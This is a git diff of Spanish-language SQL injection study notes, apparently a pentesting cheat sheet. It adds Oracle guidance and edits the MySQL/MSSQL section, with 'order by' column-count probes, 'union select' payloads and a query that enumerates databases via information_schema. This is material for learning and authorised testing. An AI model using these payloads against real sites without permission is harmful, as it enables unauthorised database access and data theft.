@@ -36,12 +36,19 @@ Con una base de datos que nos interese podemos acceder a su contenido con
 Identificar el numero de columnas
 `' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
+Una vez ya hemos identificado las columnas debemos probar con un
+`' union select 'a','b' from dual-- -` | `' union select 1,2 from dual-- -` | `' union select NULL,NULL from dual-- -`, si hubiese tres columnas seria 1,2,3 etc, hay que poner el dual pur que en Oracle siempre hay que llamar a una tabla
+
+
+
+
+
 #### MySQL y MSSQL
 Identificar el numero de columnas
 `'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
 Una vez ya hemos identificado las columnas debemos probar con un
-`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select en la pagina por lo cual identificamos que es una base de datos MySQL o MSSQL
+`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, si hubiese tres columnas seria 1,2,3 etc
 
 Para enumerar las bases de datos existentes
 `' union select 1,schema_name from information_schema.schemata-- -`
